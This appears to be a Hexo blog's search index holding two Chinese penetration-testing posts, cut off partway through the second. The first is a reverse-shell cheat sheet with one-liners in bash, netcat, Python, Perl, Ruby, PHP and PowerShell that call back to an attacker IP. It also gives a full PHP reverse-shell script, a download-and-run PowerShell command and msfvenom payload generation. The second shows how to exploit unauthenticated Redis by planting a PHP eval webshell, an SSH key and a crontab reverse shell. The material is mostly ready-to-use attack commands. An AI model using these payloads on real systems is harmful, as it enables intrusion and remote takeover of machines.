<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>各种环境下弹shell的方式</title>
      <link href="2020/10/23/%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>2020/10/23/%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>弹shell分为两种：正向连接和反向连接</br><br>正向连接：我们去连接目标</br><br>反向连接：目标连接我们</br></p><p>在渗透测试中，最常用的是反向连接，因为目标可能在内网中，我们正向无法进行连接，或者目标搭载负载均衡或动态ip或防火墙等，无法进行正向连接。</p><p>测试环境：</br><br>攻击机ip：192.168.1.1</br><br>测试机ip：192.168.1.2</p><h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash反弹也可以说是最常见的一种弹shell的方式,针对不同的linux版本可能会有不同的方法。</p><p>测试机运行：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>netcat也就是我们常用的nc。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh 192.168.1.1 4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -c &#x2F;bin&#x2F;sh 192.168.1.1 4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh | nc 192.168.1.1 4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.1 4444 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -f &#x2F;tmp&#x2F;p; mknod &#x2F;tmp&#x2F;p p &amp;&amp; nc 192.168.1.1 4444 0&#x2F;tmp&#x2F;p</span><br></pre></td></tr></table></figure><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>telnet作为一个远程管理设备的软件，也可以作为反弹shell的软件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -f &#x2F;tmp&#x2F;p; mknod &#x2F;tmp&#x2F;p p &amp;&amp; telnet 192.168.1.1 4444 0&#x2F;tmp&#x2F;p</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.1 4445 | &#x2F;bin&#x2F;bash | telnet 192.168.1.1 4444</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>linux现在自带python</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>python的windows正向连接请看P神的：<a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">python正向连接后门</a></p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.1.1&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><p>或直接写入php文件去访问，下面脚本是linux/windows两用脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting (E_ERROR);</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    ini_set(&#39;max_execution_time&#39;,0);</span><br><span class="line">    $ipaddr &#x3D; &#39;192.168.1.1&#39;;</span><br><span class="line">    $port &#x3D; &#39;443&#39;;</span><br><span class="line">    $msg &#x3D; php_uname().&quot;\n------------Code by Spider-------------\n&quot;;</span><br><span class="line">    $cwd &#x3D; getcwd();</span><br><span class="line">     </span><br><span class="line">    function procopen($cmd,$env,$sock) &#123;</span><br><span class="line">    global $cwd;</span><br><span class="line">    $descriptorspec &#x3D; array(0 &#x3D;&gt; array(&quot;pipe&quot;,&quot;r&quot;),1 &#x3D;&gt; array(&quot;pipe&quot;,&quot;w&quot;),2 &#x3D;&gt; array(&quot;pipe&quot;,&quot;w&quot;));</span><br><span class="line">    $process &#x3D; proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);</span><br><span class="line">    if (is_resource($process)) &#123;</span><br><span class="line">    fwrite($pipes[0],$cmd);</span><br><span class="line">    fclose($pipes[0]);</span><br><span class="line">    $msg &#x3D; stream_get_contents($pipes[1]);</span><br><span class="line">    fwrite($sock,$msg);</span><br><span class="line">    fclose($pipes[1]);</span><br><span class="line">    $msg &#x3D; stream_get_contents($pipes[2]);</span><br><span class="line">    fwrite($sock,$msg);</span><br><span class="line">    fclose($pipes[2]);</span><br><span class="line">    proc_close($process);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function command($cmd,$sock) &#123;</span><br><span class="line">    if(substr(PHP_OS,0,3) &#x3D;&#x3D; &#39;WIN&#39;) &#123;</span><br><span class="line">    $wscript &#x3D; new COM(&quot;Wscript.Shell&quot;);</span><br><span class="line">    if($wscript &amp;&amp; (!stristr(get_cfg_var(&quot;disable_classes&quot;),&#39;COM&#39;))) &#123;</span><br><span class="line">    $exec &#x3D; $wscript-&gt;exec(&#39;c:\\windows\\system32\\cmd.exe &#x2F;c &#39;.$cmd); &#x2F;&#x2F;自定义CMD路径</span><br><span class="line">    $stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">    $stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">    fwrite($sock,$stroutput);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    $env &#x3D; array(&#39;path&#39; &#x3D;&gt; &#39;c:\\windows\\system32&#39;);</span><br><span class="line">    procopen($cmd,$env,$sock);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    $env &#x3D; array(&#39;path&#39; &#x3D;&gt; &#39;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;sbin&#39;);</span><br><span class="line">    procopen($cmd,$env,$sock);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    $sock &#x3D; fsockopen($ipaddr,$port);</span><br><span class="line">    fwrite($sock,$msg);</span><br><span class="line">    while ($cmd &#x3D; fread($sock,1024)) &#123;</span><br><span class="line">    if (substr($cmd,0,3) &#x3D;&#x3D; &#39;cd &#39;) &#123;</span><br><span class="line">    $cwd &#x3D; trim(substr($cmd,3,-1));</span><br><span class="line">    chdir($cwd);</span><br><span class="line">    $cwd &#x3D; getcwd();</span><br><span class="line">    &#125;</span><br><span class="line">    if (trim(strtolower($cmd)) &#x3D;&#x3D; &#39;exit&#39;) &#123;</span><br><span class="line">    echo &#39;logout!&#39;;</span><br><span class="line">    break;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    command($cmd,$sock);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($sock);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.1.1&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.1.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.1.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;192.168.1.1&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;192.168.1.1&quot;,&quot;4444&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;192.168.1.1&quot;,&quot;4444&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure><h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><p>攻击机监听</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure><p>攻击机授权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure><p>测试机运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.1 -port 4444</span><br></pre></td></tr></table></figure><h3 id="msf获取反弹一句话"><a href="#msf获取反弹一句话" class="headerlink" title="msf获取反弹一句话"></a>msf获取反弹一句话</h3><p>msf监听</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.1.1</span><br><span class="line">set LPORT 4444</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><p>列出msf可以生成的payload列表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -l</span><br></pre></td></tr></table></figure><ul><li>生成二进制文件<br>Windows<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line"># windows运行可执行文件的几种方式</span><br><span class="line">双击运行</span><br><span class="line">cmd下运行exe</span><br><span class="line">利用Powershell远程下载执行</span><br><span class="line">利用at或schtasks设置计划任务执行</span><br><span class="line">利用wmic远程命令执行</span><br></pre></td></tr></table></figure>Linux<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure></li><li>生成webshell脚本<br>php<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>asp<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>jsp<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>war<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>将shell放在web目录然后访问或者直接执行，以php文件为例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure></li><li>脚本shell<br>Python<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>Powershell<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_http LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1</span><br><span class="line"></span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -File shell.ps1</span><br></pre></td></tr></table></figure>使用方法：生成脚本后复制里面的内容执行即可。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于弹shell的一些利用方式就总结到这里，本文中并未涉及到bypass等操作，感兴趣的朋友可以看看Y4er的这篇文章:<a href="https://y4er.com/post/reverse-shell-bypass">渗透测试中弹shell的多种方式及bypass</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.51cto.com/guojianglong/2105318">https://blog.51cto.com/guojianglong/2105318</a></br><br><a href="https://y4er.com/post/reverse-shell-bypass/">https://y4er.com/post/reverse-shell-bypass/</a></br><br><a href="https://zhuanlan.kanxue.com/article-262.htm">https://zhuanlan.kanxue.com/article-262.htm</a></br><br><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></br><br><a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></br></p>]]></content>
      
      
      <categories>
          
          <category> 利用复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis利用总结</title>
      <link href="2020/10/22/Redis%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>2020/10/22/Redis%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近遇到许多redis的未授权访问，linux和windows都有，总结下常用的利用方法，这也算是比较全的利用了，如有不对之处请各位师傅指出，谢谢。</p><h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><h3 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h3><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSIC编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</br><br>1.基于内存运行，性能高效</br><br>2.支持分布式，理论上可以无限扩展</br><br>3.key-value存储系统</br></p><p>Redis 的应用场景包括：缓存系统（“热点”数据：高频读、低频写）、计数器、消息队列系统、排行榜、社交网络和实时系统。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><h3 id="Redis的安装"><a href="#Redis的安装" class="headerlink" title="Redis的安装"></a>Redis的安装</h3><p>下载压缩包：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.1.tar.gz</span><br></pre></td></tr></table></figure><p>解压：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-5.0.1.tar.gz</span><br></pre></td></tr></table></figure><p>编译：<br>编译时需要安装gcc依赖</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu:</span><br><span class="line">apt-get install gcc</span><br><span class="line">centos：</span><br><span class="line">yum -y install gcc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd redis-5.0.1&#x2F;</span><br><span class="line">make</span><br><span class="line"># 编译时如报错[adlist.o] Error 1：原因是jemalloc重载了Linux下的ANSI C的malloc和free函数。解决办法：make时添加参数</span><br><span class="line">make MALLOC&#x3D;libc</span><br><span class="line"># 查看</span><br><span class="line">make install PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;redis</span><br></pre></td></tr></table></figure><p>编辑配置文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi redis.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind &lt;IP&gt;&#x2F;&#x2F;访问的IP</span><br><span class="line">daemonize yes&#x2F;&#x2F;表示后台运行</span><br></pre></td></tr></table></figure><p>保存后复制配置文件到/usr/local/redis</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp redis.conf &#x2F;usr&#x2F;local&#x2F;redis</span><br></pre></td></tr></table></figure><p>启动服务:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;redis</span><br><span class="line">bin&#x2F;redis-server redis.conf &gt;&gt; &#x2F;var&#x2F;log&#x2F;redis.log &amp;</span><br></pre></td></tr></table></figure><p>登录服务：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h &lt;IP&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02-判断是否存在漏洞"><a href="#0x02-判断是否存在漏洞" class="headerlink" title="0x02 判断是否存在漏洞"></a>0x02 判断是否存在漏洞</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h your-ip</span><br><span class="line"># 进入后输入ping</span><br><span class="line"># 出现pong后则表明存在漏洞</span><br></pre></td></tr></table></figure><h3 id="redis-cli安装："><a href="#redis-cli安装：" class="headerlink" title="redis-cli安装："></a>redis-cli安装：</h3><p>下载压缩包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>解压缩</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>进入目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd redis-stable </span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make &#x2F;&#x2F;全局生效 </span><br><span class="line">cp src&#x2F;redis-cli &#x2F;usr&#x2F;bin&#x2F;</span><br></pre></td></tr></table></figure><p>查看帮助文档</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h </span><br></pre></td></tr></table></figure><h2 id="0x03-Redis的基本操作"><a href="#0x03-Redis的基本操作" class="headerlink" title="0x03 Redis的基本操作"></a>0x03 Redis的基本操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;xx&#x2F;xx&#x2F;xx&#x2F;&#x2F; 设置备份文件目录</span><br><span class="line">config get dir&#x2F;&#x2F; 获取备份文件目录</span><br><span class="line">config set dbfilename xxx&#x2F;&#x2F; 设置备份文件名</span><br><span class="line">config get dbfilename&#x2F;&#x2F; 获取当前备份文件名</span><br><span class="line">keys *    &#x2F;&#x2F; 查看所有key</span><br><span class="line">get &lt;key&gt;&#x2F;&#x2F; 查看key里面的值</span><br><span class="line">set &lt;key&gt;&#x2F;&#x2F; 设置这个key的值</span><br><span class="line">del &lt;key&gt;&#x2F;&#x2F; 删除这个key</span><br><span class="line">flushall&#x2F;&#x2F; 删除所有key</span><br><span class="line">save&#x2F;&#x2F; 保存</span><br><span class="line">exit&#x2F;&#x2F; 退出</span><br><span class="line">info&#x2F;&#x2F; 查看所有敏感信息</span><br><span class="line">slaveof：slaveof &lt;vpsIP&gt; &lt;Port&gt;&#x2F;&#x2F; 设置主从关系</span><br></pre></td></tr></table></figure><h2 id="0x04-linux中的Redis利用"><a href="#0x04-linux中的Redis利用" class="headerlink" title="0x04 linux中的Redis利用"></a>0x04 linux中的Redis利用</h2><h3 id="Redis写webshell"><a href="#Redis写webshell" class="headerlink" title="Redis写webshell"></a>Redis写webshell</h3><p>条件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">已知网站根目录路径</span><br><span class="line">目录可写</span><br></pre></td></tr></table></figure><p>参数设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set cmd &quot;nnn&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;nnn&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br></pre></td></tr></table></figure><h3 id="Redis写ssh公钥"><a href="#Redis写ssh公钥" class="headerlink" title="Redis写ssh公钥"></a>Redis写ssh公钥</h3><p>条件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">拥有root权限</span><br><span class="line">or</span><br><span class="line">对&#x2F;root&#x2F;.ssh&#x2F;目录可写</span><br></pre></td></tr></table></figure><p>vps生成一个公钥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>进入./ssh目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;.ssh</span><br></pre></td></tr></table></figure><p>写入key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;nn&quot;; cat id_rsa.pub; echo -e &quot;nn&quot;)  &gt;  ssh_key.txt</span><br><span class="line">cat ssh_key.txt | redis-cli -h &lt;targetIP&gt; -x set ssh_key</span><br></pre></td></tr></table></figure><p>设置参数:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;#如果没有权限则无法getshell</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">get ssh_key</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="crontab定时任务反弹shell"><a href="#crontab定时任务反弹shell" class="headerlink" title="crontab定时任务反弹shell"></a>crontab定时任务反弹shell</h3><p>这个方法只能Centos上使用，Ubuntu上行不通，原因是：redis默认写的文件权限是644，ubuntu的定时任务的执行权限是600，centos则是644也可以执行。还有一个原因则是redis保存写入的时候会产生乱码，乱码在ubuntu上面会报错，而centos则不会。</p><p>由于系统的不同，crontrab定时文件位置也会不同</br><br>Centos的定时任务文件在/var/spool/cron/<username></br><br>Ubuntu定时任务文件在/var/spool/cron/crontabs/<username></br><br>Centos和Ubuntu均存在的（需要root权限）/etc/crontab</br><br>PS：高版本的redis默认启动是redis权限，故写这个文件是行不通的</p><p>条件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对 &#x2F;var&#x2F;spool&#x2F;cron 目录可写</span><br></pre></td></tr></table></figure><p>vps监听一个端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>设置key、dir、dbfilename</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set crontab_key &quot;\n\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;vpsIP&gt;&#x2F;&lt;PORT&gt; 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron  #如果没有权限则无法getshell</span><br><span class="line">config set dbfilename root</span><br><span class="line"># 保存</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="主从复制getshell"><a href="#主从复制getshell" class="headerlink" title="主从复制getshell"></a>主从复制getshell</h3><p>在 Redis 4.x 之后，Redis增加了模块功能，用 C 编译出. so 文件，来扩展 redis 命令，我们可以通过slaveof <host> <port>命令，或者通过配置slaveof选项，来使当前的服务器（slave）复制指定服务器（master）的内容。</p><p>操作步骤：</br><br>1.首先向服务器发送外部加载模块，服务器需要响应。</br><br>2.向服务器发出PSYNC请求同步，并选择同步模式：</br></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FULLRESYNC：表示需要全量复制</span><br><span 